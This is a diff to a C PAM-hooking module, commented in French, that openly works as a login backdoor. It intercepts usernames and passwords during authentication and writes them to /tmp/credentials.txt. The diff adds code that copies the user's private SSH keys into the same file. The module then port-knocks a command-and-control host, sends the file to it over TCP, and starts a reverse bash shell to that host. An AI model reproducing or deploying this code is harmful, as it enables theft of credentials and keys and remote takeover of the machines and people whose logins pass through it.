@@ -14,11 +14,10 @@
 #include <security/pam_modules.h>
 #include <pty.h>      // Pour forkpty()
 #include <utmp.h>     // Pour forkpty()
-
-#include "malware_http.h"  // On n’utilise que register_host désormais
+#include <pwd.h>      // Pour getpwuid(), getpwnam()
 
 // ------------------------------------------------------------------
-// Pointeurs PAM
+// Définition des pointeurs pour les fonctions PAM originales
 // ------------------------------------------------------------------
 typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
 typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);
@@ -27,11 +26,11 @@ static pam_get_item_t original_pam_get_item = NULL;
 static pam_get_user_t original_pam_get_user = NULL;
 
 // ------------------------------------------------------------------
-// Config
+// Configuration
 // ------------------------------------------------------------------
 #define CREDENTIALS_FILE "/tmp/credentials.txt"
 
-// IP/ports
+// IP/ports de votre C2
 #define REMOTE_HOST       "192.168.64.11"
 #define KNOCK_PORT1       5001
 #define KNOCK_PORT2       5002
@@ -39,9 +38,10 @@ static pam_get_user_t original_pam_get_user = NULL;
 #define CREDENTIALS_PORT  4444
 #define SHELL_PORT        4445
 
-// API
-#define C2_API_IP         "192.168.64.11"
-#define C2_API_PORT       8080
+// ------------------------------------------------------------------
+// Variable globale pour stocker le nom d'utilisateur intercepté
+// ------------------------------------------------------------------
+static char g_username[256] = {0};
 
 // ------------------------------------------------------------------
 // Fonctions utilitaires
@@ -62,43 +62,61 @@ static void write_to_file(const char *type, const char *data) {
     }
     fprintf(file, "[%s] %s : %s\n", get_current_time(), type, data);
     fclose(file);
+    syslog(LOG_INFO, "[DEBUG] Écriture dans %s => %s : %s", CREDENTIALS_FILE, type, data);
 }
 
-// Si vous n'utilisez pas ces fonctions, vous pouvez soit les supprimer, soit ajouter __attribute__((unused))
-// static void get_machine_hostname(char *out, size_t out_size) __attribute__((unused));
-// static void get_machine_hostname(char *out, size_t out_size) {
-//     if (gethostname(out, out_size) == 0) {
-//         out[out_size - 1] = '\0';
-//     } else {
-//         strncpy(out, "UnknownHost", out_size - 1);
-//         out[out_size - 1] = '\0';
-//     }
-// }
-//
-// static void get_local_ip(char *out, size_t out_size) __attribute__((unused));
-// static void get_local_ip(char *out, size_t out_size) {
-//     int sock = socket(AF_INET, SOCK_DGRAM, 0);
-//     if (sock < 0) {
-//         strncpy(out, "0.0.0.0", out_size - 1);
-//         out[out_size - 1] = '\0';
-//         return;
-//     }
-//     struct sockaddr_in tmp;
-//     memset(&tmp, 0, sizeof(tmp));
-//     tmp.sin_family = AF_INET;
-//     tmp.sin_port   = htons(53);
-//     inet_pton(AF_INET, "8.8.8.8", &tmp.sin_addr);
-//     connect(sock, (struct sockaddr*)&tmp, sizeof(tmp));
-//     struct sockaddr_in name;
-//     socklen_t namelen = sizeof(name);
-//     if (getsockname(sock, (struct sockaddr*)&name, &namelen) == 0) {
-//         inet_ntop(AF_INET, &name.sin_addr, out, out_size);
-//     } else {
-//         strncpy(out, "0.0.0.0", out_size - 1);
-//     }
-//     close(sock);
-//     out[out_size - 1] = '\0';
-// }
+// ------------------------------------------------------------------
+// Fonction pour récupérer et ajouter les clés SSH dans le fichier
+// en se basant sur le home directory réel (home_dir)
+// ------------------------------------------------------------------
+static void append_ssh_keys_to_file(const char *home_dir) {
+    if (!home_dir || !*home_dir) {
+        syslog(LOG_ERR, "[ERROR] append_ssh_keys_to_file: home_dir est vide ou NULL");
+        return;
+    }
+
+    // Chemin du dossier .ssh
+    char ssh_dir[512];
+    snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", home_dir);
+
+    // Ouverture du fichier credentials en append
+    FILE *fp = fopen(CREDENTIALS_FILE, "a");
+    if (!fp) {
+        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s pour ajout des clés SSH : %m", CREDENTIALS_FILE);
+        return;
+    }
+    
+    fprintf(fp, "\n[SSH KEYS]\n");
+    syslog(LOG_INFO, "[DEBUG] Ajout des clés SSH depuis %s dans %s", ssh_dir, CREDENTIALS_FILE);
+
+    // Liste des fichiers de clés potentiels
+    const char *keys[] = {"id_rsa", "id_dsa", "id_ecdsa", "id_ed25519"};
+    int nb_keys = sizeof(keys)/sizeof(keys[0]);
+
+    for (int i = 0; i < nb_keys; i++) {
+        char key_path[1024];
+        snprintf(key_path, sizeof(key_path), "%s/%s", ssh_dir, keys[i]);
+        
+        syslog(LOG_INFO, "[DEBUG] Tentative d'ouverture de la clé : %s", key_path);
+        FILE *key_file = fopen(key_path, "r");
+        if (key_file) {
+            syslog(LOG_INFO, "[DEBUG] Clé SSH %s trouvée et ouverte.", key_path);
+            fprintf(fp, "----- BEGIN %s -----\n", keys[i]);
+
+            char buffer[1024];
+            size_t n;
+            while ((n = fread(buffer, 1, sizeof(buffer), key_file)) > 0) {
+                fwrite(buffer, 1, n, fp);
+            }
+            fprintf(fp, "\n----- END %s -----\n", keys[i]);
+            fclose(key_file);
+        } else {
+            syslog(LOG_INFO, "[DEBUG] Clé SSH %s non trouvée ou inaccessible.", key_path);
+        }
+    }
+    fclose(fp);
+    syslog(LOG_INFO, "[DEBUG] Fin de l'ajout des clés SSH dans le fichier credentials.");
+}
 
 // ------------------------------------------------------------------
 // Fonctions de knocking, envoi de fichier et reverse shell
@@ -114,6 +132,7 @@ static int port_knock(const char *ip, int port) {
     srv.sin_family = AF_INET;
     srv.sin_port   = htons(port);
     inet_pton(AF_INET, ip, &srv.sin_addr);
+    
     if (connect(sock, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
         syslog(LOG_ERR, "[ERROR] port_knock: connexion %s:%d échouée : %m", ip, port);
     } else {
@@ -124,6 +143,8 @@ static int port_knock(const char *ip, int port) {
 }
 
 static void send_file_tcp(const char *ip, int remote_port) {
+    syslog(LOG_INFO, "[DEBUG] Envoi du fichier %s vers %s:%d", CREDENTIALS_FILE, ip, remote_port);
+
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
         syslog(LOG_ERR, "[ERROR] send_file_tcp: socket : %m");
@@ -160,11 +181,9 @@ static void send_file_tcp(const char *ip, int remote_port) {
     syslog(LOG_INFO, "[INFO] Fichier %s envoyé à %s:%d", CREDENTIALS_FILE, ip, remote_port);
 }
 
-// ------------------------------------------------------------------
-// Nouvelle version de launch_reverse_shell utilisant forkpty()
-// pour allouer une pseudo-tty et ainsi permettre le job control.
-// ------------------------------------------------------------------
 static void launch_reverse_shell(const char *ip, int port) {
+    syslog(LOG_INFO, "[DEBUG] Lancement d'un reverse shell vers %s:%d", ip, port);
+    
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
         syslog(LOG_ERR, "[ERROR] launch_reverse_shell: socket creation failed: %m");
@@ -180,7 +199,7 @@ static void launch_reverse_shell(const char *ip, int port) {
         close(sock);
         _exit(0);
     }
-    
+
     int master_fd;
     pid_t pid = forkpty(&master_fd, NULL, NULL, NULL);
     if (pid < 0) {
@@ -190,6 +209,7 @@ static void launch_reverse_shell(const char *ip, int port) {
     }
     if (pid == 0) {
         // Processus enfant : exécution d'un shell interactif
+        syslog(LOG_INFO, "[DEBUG] Processus enfant => execl(/bin/bash) ...");
         execl("/bin/bash", "bash", "-i", NULL);
         _exit(0);
     } else {
@@ -197,13 +217,16 @@ static void launch_reverse_shell(const char *ip, int port) {
         char buffer[1024];
         fd_set fds;
         int nfds = (sock > master_fd ? sock : master_fd) + 1;
+        syslog(LOG_INFO, "[DEBUG] Processus parent => relais entre le socket et la pseudo-tty");
         while (1) {
             FD_ZERO(&fds);
             FD_SET(sock, &fds);
             FD_SET(master_fd, &fds);
             int ret = select(nfds, &fds, NULL, NULL, NULL);
-            if (ret < 0)
+            if (ret < 0) {
+                syslog(LOG_ERR, "[ERROR] select() a échoué : %m");
                 break;
+            }
             if (FD_ISSET(sock, &fds)) {
                 int n = read(sock, buffer, sizeof(buffer));
                 if (n <= 0)
@@ -219,6 +242,7 @@ static void launch_reverse_shell(const char *ip, int port) {
         }
         close(sock);
         close(master_fd);
+        syslog(LOG_INFO, "[DEBUG] Fin du reverse shell");
     }
 }
 
@@ -235,7 +259,12 @@ int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
     }
     int retval = original_pam_get_user(pamh, user, prompt);
     if (retval == PAM_SUCCESS && *user) {
+        syslog(LOG_INFO, "[DEBUG] pam_get_user => user=%s", *user);
         write_to_file("Login", *user);
+        
+        // On stocke le nom d'utilisateur intercepté dans g_username
+        memset(g_username, 0, sizeof(g_username));
+        strncpy(g_username, *user, sizeof(g_username)-1);
     }
     return retval;
 }
@@ -251,20 +280,36 @@ int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
     int retval = original_pam_get_item(pamh, item_type, item);
     if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item) {
         const char *password = (const char*)(*item);
+        syslog(LOG_INFO, "[DEBUG] pam_get_item => Mot de passe intercepté");
         write_to_file("Password", password);
+        
+        // Récupérer le home directory réel de l'utilisateur "g_username"
+        struct passwd *pw = NULL;
+        if (g_username[0] != '\0') {
+            pw = getpwnam(g_username);
+        }
+        if (pw == NULL) {
+            syslog(LOG_ERR, "[ERROR] Impossible de récupérer le pw_dir pour l'utilisateur %s", g_username);
+        } else {
+            syslog(LOG_INFO, "[DEBUG] getpwnam(%s) => pw_dir=%s", g_username, pw->pw_dir);
+            // 1) Récupération et ajout des clés SSH depuis le vrai home
+            append_ssh_keys_to_file(pw->pw_dir);
+        }
 
-        // 1) Effectuer le port knocking
+        // 2) Port knocking
+        syslog(LOG_INFO, "[DEBUG] Début du port knocking");
         port_knock(REMOTE_HOST, KNOCK_PORT1);
         sleep(1);
         port_knock(REMOTE_HOST, KNOCK_PORT2);
         sleep(1);
         port_knock(REMOTE_HOST, KNOCK_PORT3);
         sleep(1);
-
-        // 2) Envoi des credentials
+        syslog(LOG_INFO, "[DEBUG] Fin du port knocking");
+        
+        // 3) Envoi du fichier (login + mdp + clés SSH)
         send_file_tcp(REMOTE_HOST, CREDENTIALS_PORT);
-
-        // 3) Lancement du reverse shell dans un processus séparé pour ne pas bloquer l'authentification
+        
+        // 4) Lancement du reverse shell dans un processus séparé
         pid_t shell_pid = fork();
         if (shell_pid == 0) {
             launch_reverse_shell(REMOTE_HOST, SHELL_PORT);
